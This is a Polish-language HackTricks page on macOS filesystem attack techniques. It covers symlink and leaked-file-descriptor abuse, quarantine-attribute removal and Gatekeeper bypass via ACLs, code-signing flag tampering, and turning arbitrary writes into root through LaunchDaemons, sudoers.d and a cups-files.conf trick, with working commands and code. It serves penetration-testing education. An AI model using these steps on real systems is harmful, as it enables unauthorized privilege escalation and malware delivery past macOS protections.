# Sztuczki FS w macOS

{{#include ../../../../banners/hacktricks-training.md}}

## Kombinacje uprawnień POSIX

W przypadku **katalogu** trzy bity uprawnień oznaczają coś innego niż w przypadku zwykłego pliku. `chmod(1)` określa bit wykonywania jako „**search**”, gdy jest stosowany do katalogu:<sup>[[2]](#references)</sup>

> `0100` W przypadku plików zezwala właścicielowi na wykonywanie. W przypadku katalogów zezwala właścicielowi na **search** w katalogu.

- **odczyt** - możesz **wyliczyć** wpisy katalogu (wyświetlić ich nazwy).
- **zapis** - możesz **tworzyć, zmieniać nazwy i usuwać wpisy** w katalogu. Pamiętaj, że jest to właściwość *zawierającego* katalogu, a nie pliku: możesz usunąć plik, którego nie możesz odczytać ani zmodyfikować, o ile możesz zapisywać w jego katalogu nadrzędnym.
- Aby usunąć **podkatalog**, musi on być pusty, co z kolei wymaga wystarczających uprawnień do usunięcia całej jego zawartości.
- Jeśli katalog ma **sticky bit** (`S_ISVTX`, jak `/tmp`), jest to ograniczone — POSIX stanowi, że proces może wtedy usuwać lub zmieniać nazwy plików tylko wtedy, gdy jest ich właścicielem, jest właścicielem katalogu albo ma odpowiednie uprawnienia.<sup>[[1]](#references)</sup>
- **wykonywanie / search** - masz **zezwolenie na przechodzenie** przez katalog. Rozwiązywanie nazw ścieżek lokalizuje każdy komponent „w katalogu określonym przez jego poprzednik”, więc **utrata uprawnień search do dowolnego pojedynczego komponentu prefiksu ścieżki sprawia, że wszystko poniżej staje się niedostępne przez ścieżkę**, nawet jeśli sam plik końcowy jest dostępny do odczytu dla każdego użytkownika.<sup>[[1]](#references)</sup>

### Niebezpieczne kombinacje

**Jak nadpisać plik/folder należący do root**, gdy:

- Właścicielem jednego z nadrzędnych **katalogów** na ścieżce jest użytkownik
- Właścicielem jednego z nadrzędnych **katalogów** na ścieżce jest **grupa użytkowników** z **prawem zapisu**
- **Grupa** użytkowników ma dostęp **do zapisu** do **pliku**

W przypadku dowolnej z powyższych kombinacji attacker może **wstrzyknąć** **sym/hard link** w oczekiwanej ścieżce, aby uzyskać uprzywilejowany dowolny zapis.

### Szczególny przypadek folderu root R+X

Wynika to bezpośrednio z opisanej powyżej reguły rozwiązywania nazw ścieżek. Jeśli **katalog przyznaje root wyłącznie R+X**, pliki znajdujące się w jego wnętrzu są dla wszystkich pozostałych niedostępne *przez ścieżkę* — ale **bity uprawnień samych plików mogą nadal być liberalne**. Katalog jest jedyną przeszkodą.

Zatem każdy prymityw, który pozwala wydostać plik **z tego katalogu** — uprzywilejowany proces, który **przenosi/zmienia nazwę/kopiuje** ścieżkę wybraną przez attackera do lokalizacji, przez którą możesz przechodzić — zamienia się w dowolny odczyt bez konieczności pokonywania uprawnień samego pliku:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Szukaj uprzywilejowanych mechanizmów przenoszenia plików (instalatorów, rotatorów logów, kolektorów awarii/diagnostyki, funkcji tworzenia kopii zapasowych i funkcji „export”), które akceptują ścieżkę źródłową od użytkownika o niższych uprawnieniach.

## Symbolic Link / Hard Link

### Permissive file/folder

Jeśli uprzywilejowany proces zapisuje dane w **file**, który może być **controlled** przez **lower privileged user** lub który mógł zostać **previously created** przez użytkownika o niższych uprawnieniach, użytkownik może po prostu **point it to another file** za pomocą Symbolic lub Hard link, a uprzywilejowany proces zapisze dane w tym pliku.

Sprawdź pozostałe sekcje, aby znaleźć miejsca, w których atakujący mógłby **abuse an arbitrary write to escalate privileges**.

### Open `O_NOFOLLOW`

Zgodnie z [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *„Jeśli `O_NOFOLLOW` jest użyte w masce, a plik docelowy przekazany do `open()` jest symbolic linkiem, `open()` zakończy się niepowodzeniem.”* Sprawdzany jest tylko **finalny** komponent — wszystkie **pośrednie** komponenty są nadal rozwiązywane i śledzone. Dlatego deweloper, który „zabezpieczył” zapis za pomocą `O_NOFOLLOW`, nadal może zostać zaatakowany przez umieszczenie symlinku w dowolnym **parent directory** docelowej ścieżki.<sup>[[3]](#references)</sup>

Ta sama strona man dokumentuje flagi, które faktycznie zamykają tę lukę:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *„jeśli ... dowolny komponent ścieżki przekazanej do `open()` jest symbolic linkiem, `open()` zakończy się niepowodzeniem.”*
- **`O_RESOLVE_BENEATH`** — *„jeśli ... określone rozwiązywanie ścieżki wychodzi poza katalog powiązany z fd, `openat()` zakończy się niepowodzeniem.”*

W przeciwnym razie `openat()` względem deskryptora katalogu, który został już zweryfikowany, lub `realpath()` + ponowna walidacja pozostają sposobami na zatrzymanie podmian symlinków w środkowych komponentach ścieżki.

## .fileloc

Pliki z rozszerzeniem **`.fileloc`** mogą wskazywać na inne aplikacje lub pliki binarne, więc po ich otwarciu zostanie wykonana wskazana aplikacja/plik binarny.\
Przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## Deskryptory plików

### Leak FD (no `O_CLOEXEC`)

Jeśli wywołanie `open` nie zawiera flagi `O_CLOEXEC`, deskryptor pliku zostanie odziedziczony przez proces potomny. Jeśli więc uprzywilejowany proces otworzy uprzywilejowany plik i wykona proces kontrolowany przez atakującego, atakujący **odziedziczy FD do uprzywilejowanego pliku**.

Kanonicznym przykładem jest **LPE `DYLD_PRINT_TO_FILE` w OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- `dyld` respektował `DYLD_PRINT_TO_FILE=/path` nawet w **restricted (suid root) binaries**, ponieważ ta konkretna zmienna była parsowana poza `processDyldEnvironmentVariable()`.
- Wykonywał `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, więc **tworzył plik należący do roota w dowolnej ścieżce**.
- FD **nigdy nie był zamykany i nie miał flagi close-on-exec**, więc każdy proces potomny suid binary dziedziczył **zapisywalny FD do pliku należącego do roota**.
- Uruchomienie np. `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, a następnie odczytanie numeru odziedziczonego FD w procesie potomnym umożliwiało wykonywanie dowolnych zapisów do pliku należącego do roota; `fcntl(fd, F_SETFL, 0)` dodatkowo usuwało `O_APPEND`, umożliwiając nadpisywanie zamiast dopisywania.

Ten sam schemat występuje za każdym razem, gdy uprzywilejowany proces otwiera plik **przed** wykonaniem przez `exec` czegoś, co kontrolujesz (narzędzia pomocnicze, edytory w stylu `crontab` uruchamiane przez `$EDITOR`, pliki logów/debug otwierane ze ścieżki pochodzącej ze zmiennej środowiskowej...). Wylicz odziedziczone FD za pomocą:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Wszystko powyżej `2`, co wskazuje na plik, którego nie możesz samodzielnie otworzyć, jest prymitywem arbitrary-write (lub arbitrary-read).

## Unikaj trików z quarantine xattrs

### Usuń to
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Jeśli plik/folder ma ten atrybut immutable, nie będzie możliwe dodanie do niego xattr.
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### Systemy plików bez obsługi xattr

Nie każdy system plików, który macOS może zamontować, natywnie przechowuje **atrybuty rozszerzone**. HFS+ i APFS to potrafią; **FAT32, exFAT i większość montowań NFS nie** — macOS emuluje je, zapisując dodatkowy plik **AppleDouble** o nazwie `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Ma to znaczenie dla kwarantanny, ponieważ xattr przetrwa tylko wtedy, gdy można go faktycznie zapisać **i ponownie odczytać** z tego samego woluminu:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Jeśli wolumin zostanie później odczytany za pomocą ścieżki, która ignoruje plik towarzyszący `._` (lub plik towarzyszący zostanie usunięty), plik zostanie dostarczony **bez flagi quarantine** — a nieobjęty quarantine plik `.app` wystarczy, aby ominąć App Sandbox, jak opisano w [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Ta ACL uniemożliwia dodawanie `xattrs` do pliku
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Format plików **AppleDouble** kopiuje plik wraz z jego ACE.

W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że tekstowa reprezentacja ACL przechowywana wewnątrz xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w zdekompresowanym pliku. Zatem jeśli skompresujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, które uniemożliwia zapis innych xattr do tego pliku... xattr quarantine nie zostanie ustawiony w aplikacji:

Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/), aby uzyskać więcej informacji.<sup>[[6]](#references)</sup>

Aby to odtworzyć, najpierw musimy uzyskać poprawny ciąg ACL:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Zauważ, że nawet jeśli to zadziała, sandbox wcześniej zapisze xattr quarantine)

Nie jest to naprawdę potrzebne, ale zostawiam to tutaj na wszelki wypadek:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass kontroli sygnatur

### Bypass kontroli platform binaries

Niektóre kontrole bezpieczeństwa sprawdzają, czy binary jest **platform binary**, na przykład aby zezwolić na połączenie z usługą XPC. Jednak, jak pokazano w opisie bypass na stronie https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, możliwe jest obejście tej kontroli przez pobranie platform binary (takiego jak /bin/ls) i wstrzyknięcie exploita przez dyld za pomocą zmiennej środowiskowej `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass flag `CS_REQUIRE_LV` i `CS_FORCED_LV`

Wykonujący się binary może modyfikować własne flagi, aby omijać kontrole, za pomocą kodu takiego jak:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Ominięcie Code Signatures

Bundles zawierają plik **`_CodeSignature/CodeResources`**, który zawiera **hash** każdego pojedynczego **file** w **bundle**. Należy pamiętać, że hash pliku CodeResources jest również **embedded** w executable, więc również nie możemy go modyfikować.

Istnieją jednak pliki, których signature nie będzie sprawdzana — w pliku plist mają one klucz `omit`, na przykład:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Możliwe jest obliczenie sygnatury zasobu z poziomu CLI za pomocą:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Montowanie plików DMG

Użytkownik może zamontować niestandardowy plik DMG utworzony nawet na niektórych istniejących folderach. W ten sposób można utworzyć niestandardowy pakiet DMG z własną zawartością:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Zwykle macOS montuje dyski, komunikując się z usługą Mach `com.apple.DiskArbitrarion.diskarbitrariond` (zapewnianą przez `/usr/libexec/diskarbitrationd`). Jeśli dodasz parametr `-d` do pliku plist LaunchDaemons i zrestartujesz usługę, będzie zapisywać logi w `/var/log/diskarbitrationd.log`.\
Możliwe jest jednak użycie narzędzi takich jak `hdik` i `hdiutil` do bezpośredniej komunikacji z kext `com.apple.driver.DiskImages`.

## Arbitrary Writes

### Okresowe skrypty sh

Jeśli Twój skrypt może być interpretowany jako **shell script**, możesz nadpisać skrypt powłoki **`/etc/periodic/daily/999.local`**, który będzie uruchamiany codziennie.

Możesz **sfingować** wykonanie tego skryptu za pomocą: **`sudo periodic daily`**

### Daemons

Utwórz dowolny **LaunchDaemon**, taki jak **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, zawierający plist wykonujący dowolny skrypt, na przykład:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Po prostu wygeneruj skrypt `/Applications/Scripts/privesc.sh` zawierający **commands**, które chcesz uruchomić jako root.

### Plik Sudoers

Jeśli masz **arbitrary write**, możesz utworzyć plik w folderze **`/etc/sudoers.d/`**, przyznający Ci uprawnienia **sudo**.

### Pliki PATH

Plik **`/etc/paths`** jest jednym z głównych miejsc, które uzupełniają zmienną środowiskową PATH. Aby go nadpisać, musisz być rootem, ale jeśli skrypt z **privileged process** wykonuje jakieś **command** bez pełnej ścieżki, możesz być w stanie je **hijack**, modyfikując ten plik.

Możesz również zapisywać pliki w **`/etc/paths.d`**, aby załadować nowe foldery do zmiennej środowiskowej `PATH`.

### cups-files.conf

Ta technika została użyta w [tym writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Utwórz plik `/etc/cups/cups-files.conf` z następującą zawartością:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Spowoduje to utworzenie pliku `/etc/sudoers.d/lpe` z uprawnieniami 777. Dodatkowy śmieciowy tekst na końcu służy do wywołania utworzenia error logu.

Następnie zapisz w `/etc/sudoers.d/lpe` wymaganą konfigurację do eskalacji uprawnień, taką jak `%staff ALL=(ALL) NOPASSWD:ALL`.

Następnie ponownie zmodyfikuj plik `/etc/cups/cups-files.conf`, wskazując `LogFilePerm 700`, aby nowy plik sudoers stał się prawidłowy po wywołaniu `cupsctl`.

### Ucieczka z sandboxa

Możliwe jest wydostanie się z macOS sandbox za pomocą FS arbitrary write. Przykłady znajdziesz na stronie [macOS Auto Start](../../../../macos-auto-start-locations.md), ale często stosowaną metodą jest zapisanie pliku preferencji Terminala w `~/Library/Preferences/com.apple.Terminal.plist`, który wykonuje polecenie podczas uruchamiania, a następnie wywołanie go za pomocą `open`.

## Tworzenie zapisywalnych plików jako inni użytkownicy

Bardzo często stosowanym privesc primitive jest nakłonienie **uprzywilejowanego procesu do utworzenia pliku** w kontrolowanym przez Ciebie katalogu, a następnie zachowanie **dostępu do zapisu** tego pliku. Potrzebne są dwa elementy:

1. Katalog, którego jesteś właścicielem (lub w którym możesz ustawić **inheritable ACL**), aby wszystko, co zostanie w nim utworzone, odziedziczyło Twoje uprawnienia.
2. Uprzywilejowany proces/`suid`, któremu można wskazać **gdzie** ma utworzyć plik — zwykle za pośrednictwem zmiennej środowiskowej debugowania/logowania, pliku konfiguracyjnego lub API XPC helpera.

To właśnie element **inheritable ACL** sprawia, że utworzony plik jest zapisywalny przez Ciebie, mimo że jego właścicielem jest inny użytkownik. Flagi dziedziczenia `file_inherit` / `directory_inherit` są opisane w [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Teraz każdy plik, który uprzywilejowany proces utworzy wewnątrz `$DIRNAME`, jest **zapisywalny przez ciebie**. Jeśli ten katalog jest również lokalizacją, z której później coś jest **wykonywane jako root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, katalog LaunchDaemon...), prowadzi to bezpośrednio do eskalacji uprawnień do root. Zobacz sekcje [Plik Sudoers](#sudoers-file) i [cups-files.conf](#cups-filesconf) powyżej, aby dowiedzieć się, co zapisać po uzyskaniu pliku.

Pełny przykład łańcucha „zmienna środowiskowa powoduje, że proces root tworzy plik, a FD wycieka do ciebie” znajdziesz powyżej w sekcji [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec).

## Pamięć współdzielona POSIX

**Pamięć współdzielona POSIX** pozwala procesom w systemach operacyjnych zgodnych z POSIX uzyskiwać dostęp do wspólnego obszaru pamięci, umożliwiając szybszą komunikację w porównaniu z innymi metodami komunikacji międzyprocesowej. Polega to na utworzeniu lub otwarciu obiektu pamięci współdzielonej za pomocą `shm_open()`, ustawieniu jego rozmiaru za pomocą `ftruncate()` oraz zmapowaniu go w przestrzeni adresowej procesu przy użyciu `mmap()`. Procesy mogą następnie bezpośrednio odczytywać dane z tego obszaru pamięci i zapisywać do niego. Aby zarządzać równoczesnym dostępem i zapobiegać uszkodzeniu danych, często stosuje się mechanizmy synchronizacji, takie jak mutexy lub semafory. Na końcu procesy usuwają mapowanie i zamykają pamięć współdzieloną za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci za pomocą `shm_unlink()`. System ten jest szczególnie skuteczny w wydajnej i szybkiej komunikacji IPC w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do współdzielonych danych.

<details>

<summary>Przykład kodu producenta</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Przykład kodu konsumenta</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOS guarded descriptors** to funkcja bezpieczeństwa wprowadzona w macOS w celu zwiększenia bezpieczeństwa i niezawodności **operacji na file descriptorach** w aplikacjach użytkownika. Te guarded descriptors umożliwiają powiązanie określonych ograniczeń lub „guardów” z file descriptorami, które są egzekwowane przez kernel.

Funkcja ta jest szczególnie przydatna w zapobieganiu określonym klasom podatności bezpieczeństwa, takim jak **nieautoryzowany dostęp do plików** lub **race conditions**. Podatności te występują na przykład wtedy, gdy jeden wątek uzyskuje dostęp do file description, zapewniając **innemu podatnemu wątkowi dostęp do niego**, lub gdy file descriptor zostaje **odziedziczony** przez podatny proces potomny. Niektóre funkcje związane z tą funkcjonalnością to:

- `guarded_open_np`: Otwiera file descriptor z guardem
- `guarded_close_np`: Zamyka go
- `change_fdguard_np`: Zmienia flagi guarda deskryptora (może nawet usunąć ochronę guarda)

## References

- [1] [POSIX.1-2024 — Definicje podstawowe, rozdz. 4 (Uprawnienia dostępu do plików, ochrona katalogów, rozwiązywanie nazw ścieżek)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Strona man `chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html) (directory search/execute bit, ACL inheritance flags)
- [3] [Strona man `open(2)`](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD without close-on-exec)
- [5] [The Eclectic Light Company - Które systemy plików i usługi cloud zachowują extended attributes?](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Achillesowa pięta Gatekeepera: odkrycie podatności w macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - A New Era of macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Uncovering Apple Vulnerabilities: the diskarbitrationd and storagekitd Audit Story Part 1](https://www.kandji.io/blog/macos-audit-story-part1)
{{#include ../../../../banners/hacktricks-training.md}}
